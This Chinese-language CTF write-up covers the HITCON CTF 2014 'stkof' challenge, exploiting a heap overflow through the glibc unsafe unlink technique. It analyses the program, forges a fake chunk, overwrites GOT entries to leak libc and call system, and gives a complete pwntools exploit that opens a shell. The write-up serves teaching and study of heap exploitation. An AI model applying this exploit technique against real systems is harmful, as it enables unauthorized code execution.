## 2014 HITCON CTF stkof
### 1.序言
> 接着`how2heap`的教程走，下面是`unlink`漏洞的利用及相关练习。

有关漏洞的原理，网上已经有很多说明了，在这里我给出一些比较靠谱一点的链接:

1. [CTF WiKi](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/)
2. [堆溢出之unlink的利用-Yun](http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/)
3. [Unlink Exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html)
4. [Linux堆溢出漏洞利用之unlink](https://jaq.alibaba.com/community/art/show?articleid=360)
5. [堆溢出的unlink利用方法](https://superkieran.github.io/WooyunDrops/#!/drops/653.%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95)
### 2.程序分析
##### 1. 运行
> 程序运行起来没有任何显示，拖进`ida`之后可以分析其功能如下:
```
1. alloc
2. read_in
3. free
4. useless
```
**alloc**
> 输入分配内存的大小`size`

**read_in**
> 往分配的内存中输入内容，允许写入任意长度，漏洞在此处.

**free**
> 将分配的内存释放掉, 利用`ptmalloc`释放的规则。

**useless**
> 没什么`ruan`用

##### 2.分析
> 如果我们分配一个小内存，`read_in`的时候读入很多数据，就会造成堆溢出，`unlink`漏洞的利用.

下面演示一下漏洞所在:
```
1
10
1
OK
2
1
100
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
OK
FAIL
3
1
*** Error in `./stkof': free(): invalid next size (fast): 0x0000000002cb1420 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8d9d8257e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f8d9d82e37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f8d9d83253c]
./stkof[0x400b7f]
./stkof[0x400ccf]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8d9d7ce830]
./stkof[0x400869]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:11 4069515                            /home/bill/CTF/how2heap/unsafe_unlink/hitcon_ctf_2014/stkof
00601000-00602000 r--p 00001000 08:11 4069515                            /home/bill/CTF/how2heap/unsafe_unlink/hitcon_ctf_2014/stkof
00602000-00603000 rw-p 00002000 08:11 4069515                            /home/bill/CTF/how2heap/unsafe_unlink/hitcon_ctf_2014/stkof
00603000-00e05000 rw-p 00000000 00:00 0
02cb1000-02cd2000 rw-p 00000000 00:00 0                                  [heap]
7f8d98000000-7f8d98021000 rw-p 00000000 00:00 0
7f8d98021000-7f8d9c000000 ---p 00000000 00:00 0
7f8d9d598000-7f8d9d5ae000 r-xp 00000000 08:11 6815824                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8d9d5ae000-7f8d9d7ad000 ---p 00016000 08:11 6815824                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8d9d7ad000-7f8d9d7ae000 rw-p 00015000 08:11 6815824                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8d9d7ae000-7f8d9d96e000 r-xp 00000000 08:11 6816942                    /lib/x86_64-linux-gnu/libc-2.23.so
7f8d9d96e000-7f8d9db6e000 ---p 001c0000 08:11 6816942                    /lib/x86_64-linux-gnu/libc-2.23.so
7f8d9db6e000-7f8d9db72000 r--p 001c0000 08:11 6816942                    /lib/x86_64-linux-gnu/libc-2.23.so
7f8d9db72000-7f8d9db74000 rw-p 001c4000 08:11 6816942                    /lib/x86_64-linux-gnu/libc-2.23.so
7f8d9db74000-7f8d9db78000 rw-p 00000000 00:00 0
7f8d9db78000-7f8d9db9e000 r-xp 00000000 08:11 6816728                    /lib/x86_64-linux-gnu/ld-2.23.so
7f8d9dd7b000-7f8d9dd7e000 rw-p 00000000 00:00 0
7f8d9dd9c000-7f8d9dd9d000 rw-p 00000000 00:00 0
7f8d9dd9d000-7f8d9dd9e000 r--p 00025000 08:11 6816728                    /lib/x86_64-linux-gnu/ld-2.23.so
7f8d9dd9e000-7f8d9dd9f000 rw-p 00026000 08:11 6816728                    /lib/x86_64-linux-gnu/ld-2.23.so
7f8d9dd9f000-7f8d9dda0000 rw-p 00000000 00:00 0
7ffd57ece000-7ffd57eef000 rw-p 00000000 00:00 0                          [stack]
7ffd57f48000-7ffd57f4b000 r--p 00000000 00:00 0                          [vvar]
7ffd57f4b000-7ffd57f4d000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted (core dumped)
```
### 3.利用过程
**整体思路**: 通过`unlink`漏洞,修改`free@got`为`puts`,输入`puts@plt`,输出`puts`函数的真实地址.修改`atoi@got`为`system`, 输入`/bin/sh`的地址, 获得shell.

##### 1. `checksec`一下
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
##### 2. fake chunk
**思路**: 分配三个空间， 溢出第二个空间，使`02 chunk and 03 chunk` 合并, `unlink`.
```python
alloc(0x100)
alloc(0x30)
alloc(0x80)
# a fake chunk at global[2] = head + 16 who's size is 0x20
payload = p64(0)  		#prev_size
payload += p64(0x20)  #size
payload += p64(head + 16 - 0x18)  #fd
payload += p64(head + 16 - 0x10)  #bk
payload += p64(0x20)  # next chunk's prev_size bypass the check
payload = payload.ljust(0x30, 'a')
# overwrite global[3]'s chunk's prev_size
# make it believe that prev chunk is at global[2]
payload += p64(0x30)
# make it believe that prev chunk is free
payload += p64(0x90)
edit(2, len(payload), payload)
free(3) #unlink
```
0x602140处的内容:
```
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
0x602140:	0x0000000000000000	0x0000000001e40020
0x602150:	0x0000000000602138	0x0000000000000000
0x602160:	0x0000000000000000	0x0000000000000000
```
`free`做了一件事:*向前合并*
> 由于我们的溢出促使free函数相信我们的`02chunk`是`free`, 向前合并.
结果:
```
fd -> bk = bk ===> [head + 16 - 0x18 + 0x18] = head + 16 - 0x10
[0x602150] = 0x602140
bk -> fd = fd ===> [head + 16 - 0x10 + 0x10] = head + 16 - 0x18
[0x602150] = 0x602138
```
##### 3. 写入
```python
payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(stkof.got['atoi'])
edit(2, len(payload), payload)
```
结果:
```
0x602130:	0x0000000000000000	0x6161616161616161
0x602140:	0x0000000000602018	0x0000000000602020
0x602150:	0x0000000000602088	0x0000000000000000
```
###### 4. `[free@got] = puts@plt`
```
payload = p64(stkof.plt['puts'])
edit(0, len(payload), payload)
```
##### 5. leak address
```
free(1)
```
##### 6. `find system address and binsh address, then turn atoi@got into system_addres, send "/bin/sh" address`
```python
binsh_addr = puts_address - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
system_addr =  puts_address - (libc.symbols['puts'] -libc.symbols['system'])
edit(2, len(payload), payload)
p.send(p64(binsh_addr))
```
### `The Whole EXP`
```
from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'

context.binary = "./stkof"
stkof = ELF('./stkof')

if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./stkof")

log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')

head = 0x602140

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))


def exp():
    gdb.attach(p)
    # trigger to malloc buffer for io function
    alloc(0x100)  		# idx 1
    # begin
    alloc(0x30)  		# idx 2
    # small chunk size in order to trigger unlink
    alloc(0x80)  		# idx 3
    # a fake chunk at global[2] = head + 16 who's size is 0x20
    payload = p64(0)  		#prev_size
    payload += p64(0x20)  	#size --> except the first line, the rest two line is equal to 0x20?
    payload += p64(head + 16 - 0x18)  #fd
    payload += p64(head + 16 - 0x10)  #bk
    payload += p64(0x20)  # next chunk's prev_size bypass the check
    payload = payload.ljust(0x30, 'a')
    # overwrite global[3]'s chunk's prev_size
    # make it believe that prev chunk is at global[2]
    payload += p64(0x30)        #0x30 is the front one whole size?
    # make it believe that prev chunk is free
    payload += p64(0x90)
    edit(2, len(payload), payload)
    # unlink fake chunk, so global[2] =&(global[2]) - 0x18 = head - 8
    free(3)
    p.recvuntil('OK\n')
    #gdb.attach(p)
    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
    payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(stkof.got['atoi'])
    edit(2, len(payload), payload)
    # edit free@got to puts@plt
    payload = p64(stkof.plt['puts'])
    edit(0, len(payload), payload)

    #free global[1] to leak puts addr
    free(1)
    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base: ' + hex(libc_base))
    log.success('/bin/sh addr: ' + hex(binsh_addr))
    log.success('system addr: ' + hex(system_addr))
    # modify atoi@got to system addr
    payload = p64(system_addr)
    edit(2, len(payload), payload)
    p.send(p64(binsh_addr))
    p.interactive()


if __name__ == "__main__":
    exp()
```
### Related Link
1. [ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/)
2. [CTF WiKi](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/)
